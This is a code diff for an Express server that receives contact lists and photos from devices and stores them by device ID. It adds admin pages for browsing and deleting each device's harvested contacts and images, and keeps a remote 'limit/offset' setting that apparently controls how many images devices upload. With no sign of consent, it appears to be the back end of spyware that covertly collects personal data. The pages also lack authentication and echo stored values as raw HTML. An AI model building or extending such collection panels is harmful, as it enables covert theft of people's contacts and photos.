@@ -30,22 +30,24 @@ async function initDB() {
       device_id TEXT UNIQUE
     );
 
-    CREATE TABLE IF NOT EXISTS images (
-      id SERIAL PRIMARY KEY,
-      device_id TEXT,
-      image_url TEXT
-    );
-
     CREATE TABLE IF NOT EXISTS contacts (
       id SERIAL PRIMARY KEY,
       device_id TEXT,
-      contact TEXT
+      contact TEXT,
+      UNIQUE(device_id, contact)
+    );
+
+    CREATE TABLE IF NOT EXISTS images (
+      id SERIAL PRIMARY KEY,
+      device_id TEXT,
+      image_url TEXT,
+      UNIQUE(device_id, image_url)
     );
   `);
 }
 initDB();
 
-// ================= CONTROL =================
+// ================= CONFIG =================
 let config = { limit: 5, offset: 0 };
 
 app.get("/config/:device_id", (req, res) => {
@@ -55,49 +57,20 @@ app.get("/config/:device_id", (req, res) => {
 app.post("/set-config", (req, res) => {
   config.limit = parseInt(req.body.limit);
   config.offset = parseInt(req.body.offset);
-  res.redirect("/");
+  res.redirect("back");
 });
-// ================= DASHBOARD =================
-app.get("/", async (req, res) => {
 
+// ================= HOME =================
+app.get("/", async (req, res) => {
   const users = await pool.query("SELECT COUNT(*) FROM users");
-  const images = await pool.query("SELECT COUNT(*) FROM images");
-  const contacts = await pool.query("SELECT COUNT(*) FROM contacts");
 
   res.send(`
   <html>
-  <head>
-    <title>Dashboard</title>
-    <style>
-      body { background:#0f172a; color:white; font-family:sans-serif; padding:20px;}
-      .card { background:#1e293b; padding:20px; margin:10px; border-radius:12px;}
-      a { color:#22c55e; text-decoration:none;}
-      input { padding:5px; margin:5px;}
-      button { padding:8px 12px; background:#22c55e; border:none; color:white;}
-    </style>
-  </head>
-  <body>
-
-    <h1>🚀 Backend Dashboard</h1>
-
-    <div class="card">👤 Users: ${users.rows[0].count}</div>
-    <div class="card">🖼 Images: ${images.rows[0].count}</div>
-    <div class="card">📞 Contacts: ${contacts.rows[0].count}</div>
-
-    <div class="card">
-      <h3>⚙️ Control Upload</h3>
-      <form method="POST" action="/set-config">
-        Limit: <input type="number" name="limit" value="${config.limit}"/>
-        Offset: <input type="number" name="offset" value="${config.offset}"/>
-        <button type="submit">Update</button>
-      </form>
-    </div>
-
-    <div class="card">
-      <a href="/users">👥 View Users</a><br><br>
-      <a href="/contacts">📞 View Contacts</a>
-    </div>
-
+  <body style="background:#0f172a;color:white;padding:20px;">
+    <h1>🚀 Dashboard</h1>
+    <div>👤 Users: ${users.rows[0].count}</div>
+    <br>
+    <a href="/users">View Users</a>
   </body>
   </html>
   `);
@@ -110,7 +83,7 @@ app.post("/receive", async (req, res) => {
 
   for (let contact of data) {
     await pool.query(
-      "INSERT INTO contacts (device_id, contact) VALUES ($1, $2)",
+      "INSERT INTO contacts (device_id, contact) VALUES ($1, $2) ON CONFLICT DO NOTHING",
       [device_id, contact]
     );
   }
@@ -120,13 +93,17 @@ app.post("/receive", async (req, res) => {
     [device_id]
   );
 
-  res.send("Contacts saved ✅");
+  res.send("Contacts saved");
 });
 
 // ================= IMAGE UPLOAD =================
 app.post("/upload-image", upload.single("image"), async (req, res) => {
-  try {
 
+  if (!req.file) {
+    return res.status(400).send("No file");
+  }
+
+  try {
     const device_id = req.body.device_id;
 
     const stream = cloudinary.uploader.upload_stream(
@@ -138,7 +115,7 @@ app.post("/upload-image", upload.single("image"), async (req, res) => {
         const imageUrl = result.secure_url;
 
         await pool.query(
-          "INSERT INTO images (device_id, image_url) VALUES ($1, $2)",
+          "INSERT INTO images (device_id, image_url) VALUES ($1, $2) ON CONFLICT DO NOTHING",
           [device_id, imageUrl]
         );
 
@@ -167,8 +144,11 @@ app.get("/users", async (req, res) => {
 
   users.rows.forEach(u => {
     html += `
-      <div style="margin:10px;">
-        <a href="/user/${u.device_id}">${u.device_id}</a>
+      <div style="margin:15px;">
+        <b>${u.device_id}</b><br>
+        <a href="/contacts/${u.device_id}">📞 Contacts</a> |
+        <a href="/images/${u.device_id}">🖼 Images</a> |
+        <a href="/delete-user/${u.device_id}">❌ Delete</a>
       </div>
     `;
   });
@@ -177,8 +157,37 @@ app.get("/users", async (req, res) => {
   res.send(html);
 });
 
-// ================= USER DATA =================
-app.get("/user/:device_id", async (req, res) => {
+// ================= CONTACTS PAGE =================
+app.get("/contacts/:device_id", async (req, res) => {
+
+  const device = req.params.device_id;
+
+  const contacts = await pool.query(
+    "SELECT DISTINCT contact FROM contacts WHERE device_id=$1",
+    [device]
+  );
+
+  let html = `<html><body style="background:#0f172a;color:white;padding:20px;">`;
+
+  html += `<h2>Total Contacts: ${contacts.rows.length}</h2>`;
+
+  contacts.rows.forEach(c => {
+    html += `<div>${c.contact}</div>`;
+  });
+
+  html += `
+    <br>
+    <a href="/delete-contacts/${device}">❌ Delete All Contacts</a>
+    <br><br>
+    <a href="/users">⬅ Back</a>
+  `;
+
+  html += `</body></html>`;
+  res.send(html);
+});
+
+// ================= IMAGES PAGE =================
+app.get("/images/:device_id", async (req, res) => {
 
   const device = req.params.device_id;
 
@@ -187,46 +196,58 @@ app.get("/user/:device_id", async (req, res) => {
     [device]
   );
 
-  const contacts = await pool.query(
-    "SELECT * FROM contacts WHERE device_id=$1",
-    [device]
-  );
+  let html = `<html><body style="background:#0f172a;color:white;padding:20px;">`;
 
-  let html = `
-  <html>
-  <body style="background:#0f172a;color:white;padding:20px;">
-    <h2>Device: ${device}</h2>
-    <h3>🖼 Images</h3>
+  html += `<h2>Total Images: ${images.rows.length}</h2>`;
+
+  html += `
+    <form method="POST" action="/set-config">
+      Limit: <input name="limit" value="${config.limit}"/>
+      Offset: <input name="offset" value="${config.offset}"/>
+      <button>Update</button>
+    </form>
+    <br>
   `;
 
   images.rows.forEach(img => {
-    html += `<img src="${img.image_url}" width="150" style="margin:5px;"/>`;
+    html += `<img src="${img.image_url}" width="120" style="margin:5px;"/>`;
   });
 
-  html += `<h3>📞 Contacts</h3>`;
-
-  contacts.rows.forEach(c => {
-    html += `<div>${c.contact}</div>`;
-  });
-
-  html += `</body></html>`;
-
-  res.send(html);
-});
-
-// ================= CONTACTS PAGE =================
-app.get("/contacts", async (req, res) => {
-
-  const contacts = await pool.query("SELECT * FROM contacts");
-
-  let html = `<html><body style="background:#0f172a;color:white;padding:20px;">`;
-
-  contacts.rows.forEach(c => {
-    html += `<div>${c.device_id} → ${c.contact}</div>`;
-  });
+  html += `
+    <br><br>
+    <a href="/delete-images/${device}">❌ Delete All Images</a>
+    <br><br>
+    <a href="/users">⬅ Back</a>
+  `;
 
   html += `</body></html>`;
   res.send(html);
 });
 
-app.listen(process.env.PORT || 3000);
+// ================= DELETE =================
+
+app.get("/delete-contacts/:device_id", async (req, res) => {
+  await pool.query("DELETE FROM contacts WHERE device_id=$1", [req.params.device_id]);
+  res.redirect("/users");
+});
+
+app.get("/delete-images/:device_id", async (req, res) => {
+  await pool.query("DELETE FROM images WHERE device_id=$1", [req.params.device_id]);
+  res.redirect("/users");
+});
+
+app.get("/delete-user/:device_id", async (req, res) => {
+
+  const id = req.params.device_id;
+
+  await pool.query("DELETE FROM contacts WHERE device_id=$1", [id]);
+  await pool.query("DELETE FROM images WHERE device_id=$1", [id]);
+  await pool.query("DELETE FROM users WHERE device_id=$1", [id]);
+
+  res.redirect("/users");
+});
+
+// ================= START =================
+app.listen(process.env.PORT || 3000, () => {
+  console.log("Server running...");
+});
